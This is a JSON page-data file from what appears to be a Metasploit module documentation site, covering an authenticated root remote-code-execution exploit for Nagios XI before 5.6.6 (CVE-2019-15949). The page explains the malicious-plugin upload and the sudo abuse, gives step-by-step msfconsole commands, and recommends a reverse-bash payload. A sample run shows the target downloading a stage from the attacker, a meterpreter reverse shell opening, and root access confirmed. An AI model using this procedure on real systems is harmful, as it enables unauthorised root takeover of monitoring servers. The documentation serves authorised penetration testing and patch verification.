{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/nagios_xi_authenticated_rce","result":{"data":{"moduleMetadataJson":{"id":"21618698-feed-5135-be92-f3c62a12670c","name":"Nagios XI Authenticated Remote Command Execution","fullname":"exploit/linux/http/nagios_xi_authenticated_rce","description":"This module exploits a vulnerability in Nagios XI before 5.6.6 in\n        order to execute arbitrary commands as root.\n\n        The module uploads a malicious plugin to the Nagios XI server and then\n        executes this plugin by issuing an HTTP GET request to download a\n        system profile from the server. For all supported targets except Linux\n        (cmd), the module uses a command stager to write the exploit to the\n        target via the malicious plugin. This may not work if Nagios XI is\n        running in a restricted Unix environment, so in that case the target\n        must be set to Linux (cmd). The module then writes the payload to the\n        malicious plugin while avoiding commands that may not be supported.\n\n        Valid credentials for a user with administrative privileges are\n        required. This module was successfully tested on Nagios XI 5.6.5\n        running on CentOS 7. The module may behave differently against older\n        versions of Nagios XI. See the documentation for more information.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/nagios_xi_authenticated_rce","documentationSlug":"/modules/documentation/exploit/linux/http/nagios_xi_authenticated_rce","referencesSlug":"/modules/references/exploit/linux/http/nagios_xi_authenticated_rce"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a vulnerability in Nagios XI before 5.6.6 in order to execute arbitrary commands as root.</p>\n<p>The module first checks if the supplied credentials are valid and belong to a user with permissions to modify plugins. It then exploits these permissions by uploading a malicious plugin to the target and subsequently sending an HTTP GET request to profile.php?cmd=download. This request downloads a system profile from the server and in the process launches the getprofile.sh script as root via a passwordless sudo entry. This script executes the malicious plugin as root.</p>\n<p>For all supported targets except <code class=\"language-text\">Linux (cmd)</code>, the module uses a command stager to write the exploit to the target via the malicious plugin. However, this method may not work if Nagios XI is running in a restricted Unix environment like a minimal/custom CentOS installation. In the latter case, the target must be set to <code class=\"language-text\">Linux (cmd)</code>. For this target, the module writes the payload directly to the malicious plugin while avoiding commands that may not be supported in a restricted environment. It is recommended to use the target's default <code class=\"language-text\">cmd/unix/reverse_bash</code> payload in this scenario.</p>\n<p>If the target is found to be vulnerable but the module completes without establishing a session, try increasing the value of <code class=\"language-text\">WfsDelay</code> (the additional delay when waiting for a session). The default value of this advanced option is 10 seconds. To check it, run <code class=\"language-text\">show advanced</code>. Other possible solutions are changing the payload, manually setting the value of the <code class=\"language-text\">CMDSTAGER::FLAVOR</code> advanced option, and setting the target to <code class=\"language-text\">Linux (cmd)</code> as explained above.</p>\n<p>Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.6.5 running on CentOS 7. Please note that the module may behave differently when run against older versions of Nagios XI. For instance, during a test against Nagios XI 5.4.10, the module failed to trigger execution of the payload. Instead, the payload was executed randomly after a period of time (up to 5 minutes). Moreover, the session that was ultimately established, was not a root session.</p>\n<h2 id=\"vulnerable-system\" style=\"position:relative;\"><a href=\"#vulnerable-system\" aria-label=\"vulnerable system permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable system</h2>\n<p>Nagios XI before 5.6.6.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the module as usual</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/nagiosxi_authenticated_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set SRVHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [username]</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD [password]</code></li>\n<li>Do: <code class=\"language-text\">set payload [payload]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set LPORT [port]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ol>\n<li><code class=\"language-text\">USERNAME</code>. The username to authenticate with. This user should have permissions to modify plugins. The default setting is <code class=\"language-text\">nagiosadmin</code>, which is the default admin account for Nagios XI systems.</li>\n<li><code class=\"language-text\">PASSWORD</code>. The password to authenticate with.</li>\n</ol>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<ol start=\"0\">\n<li>Linux (x86)</li>\n<li>Linux (x64) # This is the default target.</li>\n<li>Linux (cmd) # If wget is not installed on the target, this target should be selected together with the payload cmd/unix/reverse_bash.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/nagiosxi_authenticated_rce) &gt; show options\n\nModule options (exploit/linux/http/nagiosxi_authenticated_rce):\n\n   Name       Current Setting       Required  Description\n   ----       ---------------       --------  -----------\n   PASSWORD   P@ssw0rd!             yes       Password to authenticate with\n   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.1.1           yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT      80                    yes       The target port (TCP)\n   SRVHOST    192.168.1.2           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080                  yes       The local port to listen on.\n   SSL        false                 no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                     yes       Base path to NagiosXI\n   URIPATH                          no        The URI to use for this exploit (default is random)\n   USERNAME   nagiosadmin           yes       Username to authenticate with\n   VHOST                            no        HTTP server virtual host\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   1   Linux (x64)\n\n\nmsf5 exploit(linux/http/nagiosxi_authenticated_rce) &gt; run\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Found Nagios XI application with version 5.6.5.\n[*] Using URL: http://192.168.1.2:8080/eFFP5lYvZ8eCnR0\n[*] Uploading malicious &#39;check_ping&#39; plugin...\n[*] Command Stager progress - 100% done (121/121 bytes)\n[+] Successfully uploaded plugin.\n[*] Executing plugin...\n[*] Waiting for the plugin to request the final payload...\n[*] Client 192.168.1.1 (Wget/1.14 (linux-gnu)) requested /eFFP5lYvZ8eCnR0\n[*] Sending payload to 192.168.1.1 (Wget/1.14 (linux-gnu))\n[*] Sending stage (3021284 bytes) to 192.168.1.1\n[*] Meterpreter session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.1:56510) at 2020-02-27 16:27:49 +0100\n[*] Deleting malicious &#39;check_ping&#39; plugin...\n[+] Plugin deleted.\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://github.com/jakgibb/nagiosxi-root-rce-exploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/jakgibb/nagiosxi-root-rce-exploit</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15949\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2019-15949</a></li>\n</ol>"}}},"pageContext":{"id":"21618698-feed-5135-be92-f3c62a12670c"}}}